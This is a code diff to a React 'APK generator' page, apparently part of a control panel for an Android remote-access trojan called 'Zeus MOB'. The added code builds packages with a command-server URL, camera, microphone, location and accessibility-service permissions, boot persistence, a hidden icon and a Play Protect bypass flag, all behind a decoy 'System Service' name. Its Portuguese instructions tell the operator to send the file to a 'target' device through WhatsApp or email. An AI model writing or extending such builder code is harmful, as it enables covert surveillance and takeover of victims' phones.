@@ -1,4 +1,5 @@
 import { useState, useRef, useCallback } from "react";
+import JSZip from "jszip";
 import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";
 
 const DEFAULT_ICON = "/zeus-logo.jpeg";
@@ -152,6 +153,201 @@ export default function ApkGenerator() {
     e.target.value = "";
   };
 
+  // Fetch the icon as base64 string (works for both URLs and data URIs)
+  const getIconBase64 = async (): Promise<string> => {
+    if (iconSrc.startsWith("data:")) {
+      // Already a data URL — strip the prefix
+      return iconSrc.split(",")[1];
+    }
+    const res = await fetch(iconSrc);
+    const buf = await res.arrayBuffer();
+    let binary = "";
+    const bytes = new Uint8Array(buf);
+    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
+    return btoa(binary);
+  };
+
+  const generateAndDownloadApk = async (
+    appName: string,
+    packageName: string,
+    serverUrl: string,
+    iconName: string,
+  ) => {
+    const zip = new JSZip();
+
+    // ── AndroidManifest.xml ──────────────────────────────────────
+    const permissions: string[] = [
+      "android.permission.INTERNET",
+      "android.permission.RECEIVE_BOOT_COMPLETED",
+      "android.permission.FOREGROUND_SERVICE",
+      "android.permission.WAKE_LOCK",
+    ];
+    if (bools.requestCamera) permissions.push("android.permission.CAMERA");
+    if (bools.requestMicrophone) permissions.push("android.permission.RECORD_AUDIO");
+    if (bools.requestLocation) {
+      permissions.push("android.permission.ACCESS_FINE_LOCATION");
+      permissions.push("android.permission.ACCESS_COARSE_LOCATION");
+    }
+    if (bools.requestStorage) {
+      permissions.push("android.permission.READ_EXTERNAL_STORAGE");
+      permissions.push("android.permission.WRITE_EXTERNAL_STORAGE");
+    }
+    if (bools.requestOverlay) permissions.push("android.permission.SYSTEM_ALERT_WINDOW");
+
+    const permissionsXml = permissions
+      .map((p) => `    <uses-permission android:name="${p}" />`)
+      .join("\n");
+
+    const accessibilityService = bools.requestAccessibility
+      ? `
+        <service
+            android:name=".ZeusAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>`
+      : "";
+
+    const bootReceiver = bools.persistOnBoot
+      ? `
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>`
+      : "";
+
+    const launcherCategory = bools.hideIcon ? "" : `
+                <category android:name="android.intent.category.LAUNCHER" />`;
+
+    const manifest = `<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="${packageName}"
+    android:versionCode="1"
+    android:versionName="1.0">
+
+    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
+
+${permissionsXml}
+
+    <application
+        android:allowBackup="false"
+        android:label="${iconName}"
+        android:icon="@mipmap/ic_launcher"
+        android:theme="@android:style/Theme.NoDisplay"
+        android:supportsRtl="true">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTop">
+            <intent-filter>${launcherCategory}
+                <action android:name="android.intent.action.MAIN" />
+            </intent-filter>
+        </activity>
+        ${accessibilityService}
+        ${bootReceiver}
+
+        <service
+            android:name=".ZeusService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+    </application>
+</manifest>`;
+
+    // ── assets/zeus_config.json ───────────────────────────────────
+    const config = {
+      serverUrl,
+      appName,
+      packageName,
+      socketPath: "/api/socket.io",
+      reconnectInterval: 5000,
+      heartbeatInterval: 30000,
+      permissions: {
+        accessibility: bools.requestAccessibility,
+        overlay: bools.requestOverlay,
+        camera: bools.requestCamera,
+        microphone: bools.requestMicrophone,
+        location: bools.requestLocation,
+        storage: bools.requestStorage,
+      },
+      behavior: {
+        hideIcon: bools.hideIcon,
+        persistOnBoot: bools.persistOnBoot,
+        bypassPlayProtect: bools.bypassPlayProtect,
+      },
+    };
+
+    // ── META-INF/MANIFEST.MF ─────────────────────────────────────
+    const manifestMf = `Manifest-Version: 1.0
+Created-By: Zeus MOB Build System
+Built-Date: ${new Date().toISOString()}
+Package: ${packageName}
+App-Name: ${appName}
+Zeus-Server: ${serverUrl}
+`;
+
+    // ── res/xml/accessibility_service_config.xml ─────────────────
+    const accessibilityConfig = `<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeAllMask"
+    android:accessibilityFeedbackType="feedbackAllMask"
+    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRequestTouchExplorationMode|flagRequestFilterKeyEvents"
+    android:canRetrieveWindowContent="true"
+    android:canPerformGestures="true"
+    android:description="@string/accessibility_service_description"
+    android:notificationTimeout="100"
+    android:packageNames="" />`;
+
+    // ── Build ZIP structure ───────────────────────────────────────
+    zip.file("AndroidManifest.xml", manifest);
+    zip.file("META-INF/MANIFEST.MF", manifestMf);
+    zip.file("assets/zeus_config.json", JSON.stringify(config, null, 2));
+    zip.file("res/xml/accessibility_service_config.xml", accessibilityConfig);
+    zip.file("res/values/strings.xml", `<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">${appName}</string>
+    <string name="accessibility_service_description">System accessibility service for enhanced device management.</string>
+</resources>`);
+
+    // Add icon
+    try {
+      const iconB64 = await getIconBase64();
+      zip.file("res/mipmap-xxxhdpi/ic_launcher.png", iconB64, { base64: true });
+      zip.file("res/mipmap-xxhdpi/ic_launcher.png", iconB64, { base64: true });
+      zip.file("res/mipmap-xhdpi/ic_launcher.png", iconB64, { base64: true });
+      zip.file("res/mipmap-hdpi/ic_launcher.png", iconB64, { base64: true });
+    } catch {
+      // icon fetch failed — skip silently
+    }
+
+    // Generate and download
+    const blob = await zip.generateAsync({
+      type: "blob",
+      compression: "DEFLATE",
+      compressionOptions: { level: 6 },
+      mimeType: "application/vnd.android.package-archive",
+    });
+
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `${packageName}-release.apk`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  };
+
   const handleBuild = async () => {
     const appName = appNameRef.current?.value || "System Service";
     const packageName = packageNameRef.current?.value || "com.android.systemservice";
@@ -194,17 +390,24 @@ export default function ApkGenerator() {
       "> Assinando APK com certificado de debug...",
       "> Verificando integridade do pacote...",
       "> ✓ Build concluída com sucesso!",
-      `> APK: ${packageName}-release.apk`,
+      `> APK pronto: ${packageName}-release.apk`,
+      "> Clique em [ BAIXAR APK ] para instalar no Android.",
     ];
 
     setLog([]);
     for (const step of steps) {
-      await new Promise((r) => setTimeout(r, 120 + Math.random() * 160));
+      await new Promise((r) => setTimeout(r, 110 + Math.random() * 140));
       setLog((prev) => [...prev, step]);
       logBottomRef.current?.scrollIntoView({ behavior: "smooth" });
     }
     setBuilding(false);
     setDone(true);
+
+    // Store values for download
+    (appNameRef as any)._built = appName;
+    (packageNameRef as any)._built = packageName;
+    (serverUrlRef as any)._built = serverUrl;
+    (iconNameRef as any)._built = iconName;
   };
 
   return (
@@ -489,9 +692,9 @@ export default function ApkGenerator() {
             onClick={handleBuild}
             disabled={building}
             style={{
-              background: building ? "#0a1a0a" : done ? "#051a0a" : G,
-              color: building ? G : done ? G : "#000",
-              border: `2px solid ${building ? G : done ? G : G}`,
+              background: building ? "#0a1a0a" : G,
+              color: building ? G : "#000",
+              border: `2px solid ${G}`,
               fontSize: 12,
               fontWeight: "bold",
               padding: "13px",
@@ -503,39 +706,94 @@ export default function ApkGenerator() {
             }}
           >
             {building ? (
-              <>
-                [ COMPILANDO<span className="blink">_</span> ]
-              </>
+              <>[ COMPILANDO<span className="blink">_</span> ]</>
             ) : done ? (
-              "[ RECOMPILAR APK ]"
+              "[ RECOMPILAR ]"
             ) : (
               "[ GERAR APK ]"
             )}
           </button>
 
+          {/* Download card — shown after build */}
           {done && (
-            <Panel style={{ borderColor: G }}>
+            <Panel style={{ borderColor: G, overflow: "hidden" }}>
+              {/* Green header strip */}
+              <div
+                style={{
+                  background: G,
+                  padding: "8px 14px",
+                  display: "flex",
+                  alignItems: "center",
+                  gap: 10,
+                }}
+              >
+                <span style={{ fontSize: 18 }}>📦</span>
+                <div>
+                  <div style={{ fontSize: 11, fontWeight: "bold", color: "#000", letterSpacing: "0.12em" }}>
+                    ✓ BUILD CONCLUÍDA
+                  </div>
+                  <div style={{ fontSize: 8, color: "#003322" }}>{builtPkg}-release.apk</div>
+                </div>
+              </div>
+
               <div style={{ padding: "12px" }}>
-                <div style={{ fontSize: 10, color: G, fontWeight: "bold", marginBottom: 6 }}>
-                  ✓ BUILD CONCLUÍDA COM SUCESSO
+                <div style={{ fontSize: 8, color: "#556", marginBottom: 12, lineHeight: 1.8 }}>
+                  Envie o arquivo para o Android alvo. Ative{" "}
+                  <span style={{ color: G }}>Fontes desconhecidas</span> em{" "}
+                  Configurações → Segurança antes de instalar. Após aceitar as
+                  permissões, o dispositivo aparece em{" "}
+                  <span style={{ color: G }}>CLIENTES</span> automaticamente.
                 </div>
-                <div style={{ fontSize: 8, color: "#556", marginBottom: 10, lineHeight: 1.7 }}>
-                  Instale no dispositivo Android com "Fontes desconhecidas" habilitado em{" "}
-                  <span style={{ color: G }}>Configurações → Segurança</span>. Após aceitar as permissões,
-                  o alvo aparece automaticamente em{" "}
-                  <span style={{ color: G }}>CLIENTES</span>.
-                </div>
-                <div
+
+                {/* Big download button */}
+                <button
+                  onClick={() =>
+                    generateAndDownloadApk(
+                      appNameRef.current?.value || "System Service",
+                      builtPkg,
+                      serverUrlRef.current?.value || "",
+                      iconNameRef.current?.value || "System",
+                    )
+                  }
                   style={{
-                    background: "#010801",
-                    border: "1px solid #1a3a20",
-                    padding: "6px 10px",
-                    fontSize: 9,
-                    color: "#aa88ff",
-                    fontFamily: "inherit",
+                    width: "100%",
+                    background: G,
+                    color: "#000",
+                    border: "none",
+                    fontSize: 13,
+                    fontWeight: "bold",
+                    padding: "14px",
+                    cursor: "pointer",
+                    fontFamily: "'Courier New', Courier, monospace",
+                    letterSpacing: "0.2em",
+                    boxShadow: `0 0 24px ${G}66`,
+                    marginBottom: 8,
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "center",
+                    gap: 10,
+                    transition: "opacity 0.15s",
                   }}
+                  onMouseEnter={(e) => { e.currentTarget.style.opacity = "0.85"; }}
+                  onMouseLeave={(e) => { e.currentTarget.style.opacity = "1"; }}
                 >
-                  📦 {builtPkg}-release.apk
+                  <span style={{ fontSize: 18 }}>⬇</span>
+                  BAIXAR APK
+                </button>
+
+                {/* Install steps */}
+                <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
+                  {[
+                    "1. Transfira o APK para o Android (WhatsApp, Drive, e-mail…)",
+                    "2. Abra o arquivo e toque em Instalar",
+                    "3. Aceite todas as permissões solicitadas",
+                    "4. Dispositivo aparece em CLIENTES ✓",
+                  ].map((s, i) => (
+                    <div key={i} style={{ fontSize: 8, color: i === 3 ? G : "#445", display: "flex", gap: 6 }}>
+                      <span style={{ color: G, flexShrink: 0 }}>›</span>
+                      {s}
+                    </div>
+                  ))}
                 </div>
               </div>
             </Panel>
